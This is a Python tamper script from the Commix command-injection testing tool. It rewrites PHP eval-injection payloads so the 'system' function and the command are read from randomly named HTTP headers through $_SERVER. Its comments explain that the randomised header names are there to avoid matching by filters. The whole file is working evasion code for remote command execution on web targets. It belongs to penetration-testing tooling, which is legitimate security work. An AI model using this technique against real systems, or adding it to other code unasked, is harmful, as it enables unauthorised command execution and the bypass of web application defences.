#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2026 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

import re
import random
import string
import threading

from src.utils import settings
from src.core.controller import checks

r"""
About: Moves the function and the command out of the payload and into HTTP headers it reads back through '$_SERVER'.
Notes: This tamper script works against target(s) evaluating PHP (i.e. option '--eval=php').
"""

__tamper__ = "phpserverheaders"
__priority__ = settings.PRIORITY.HIGH

# Why this script cannot be applied to the target at hand, or nothing where it can.
def dependencies():
  return checks.tamper_dep_command_incompatible(__tamper__) or \
         checks.tamper_dep_grammar_only(__tamper__, "php") or \
         _time_related_incompatible()

"""
Why this script cannot serve a technique that reads a value back rather than a page.

What it leaves in the payload is an interpolation, and an interpolation is worth a variable name -
so the command runs and prints, and the expression around it is left holding nothing. A technique
that only shows the page gets everything it needs from that; one that measures what came back - a
length, a byte at an offset, a number - measures the nothing instead, and reads it as no answer.
"""
def _time_related_incompatible():
  if settings.TIME_RELATED_ATTACK:
    return "The '" + __tamper__ + ".py' tamper script needs a technique that reads its result from the page. Skipping tamper script."

"""
The function the command is handed to.

It has to be one that prints what it runs rather than returning it. What is left in the payload is
an interpolation, which is what reaches an evaluated string at all - and what an interpolation
evaluates to is a variable name, not a value, so nothing a function returned survives it. The output
has to have reached the page by itself before then.
"""
EXECUTION_FUNCTION = "system"

# The backtick operator, which is how a payload of this grammar runs a command.
BACKTICK_COMMAND = r"`([^`]*)`"

# How many characters a generated header name carries.
NAME_LENGTH = 6

"""
The headers the payload built here is going to read, waiting for the request that carries it.

Thread-local, because a payload is tampered and then sent by the one worker that built it, while
several of them are doing the same thing at once - shared, one worker's headers would travel on
another's request and both would arrive naming something that is not there.
"""
_pending = threading.local()

if not settings.TAMPER_SCRIPTS[__tamper__]:
  settings.TAMPER_SCRIPTS[__tamper__] = True

"""
A header name of no meaning, drawn again for every payload.

Mixed case and digits, because the name is never read back as it is written - PHP upper-cases it
before it reaches '$_SERVER' - and a name that is always spelled the same way is a name to match on.
Carrying no prefix for the same reason: 'X-' is three characters of pattern in every payload that
names one, and a header is no less deliverable without it. A letter leads, since a name opening on
a digit is the one thing about it that would stand out.
"""
def _header_name():
  alphabet = string.ascii_letters + string.digits
  return random.choice(string.ascii_letters) + "".join(random.choice(alphabet) for _ in range(NAME_LENGTH - 1))

"""
What PHP calls a header once it has put it in '$_SERVER'.
"""
def _server_key(name):
  return "HTTP_" + name.upper().replace("-", "_")

"""
Whether a command can travel in a header at all.

A header value is a line, so one carrying a line break is left where it is rather than sent as
something the target would read as the end of the header.
"""
def _sendable(command):
  return command and not re.search(r"[\r\n\x00]", command)

"""
Run the command through a name and an argument the payload never spells out.

What is left in the payload is the shape of a call and nothing of what it calls: the function is a
string read out of one header, the command a string read out of another, and neither appears in the
parameter the request is testing. The two are drawn together and travel on the same request, so a
filter reading either half sees a name of no meaning and a header of no meaning.
"""
def tamper(payload):
  commands = []
  function_header = _header_name()
  taken = set([function_header.lower()])

  def _through_headers(match):
    command = match.group(1)
    if not _sendable(command):
      return match.group(0)
    while True:
      command_header = _header_name()
      if command_header.lower() not in taken:
        break
    taken.add(command_header.lower())
    commands.append((command_header, command))
    return "${$_SERVER['" + _server_key(function_header) + "']($_SERVER['" + _server_key(command_header) + "'])}"

  tampered = re.sub(BACKTICK_COMMAND, _through_headers, payload)
  # Only where something was actually moved out: a payload that runs no command has no function to
  # name either, and a header naming one would be the only odd thing about the request.
  if commands:
    _pending.headers = [(function_header, EXECUTION_FUNCTION)] + commands
  return tampered

"""
Put the headers the payload is about to read onto the request that carries it.

Cleared as they are used, so a request built without a payload of this shape - the ones a run makes
before and between its injections - does not carry the last payload's headers.
"""
def apply_headers(request):
  for name, value in getattr(_pending, "headers", []):
    request.add_header(name, value)
  _pending.headers = []

# eof
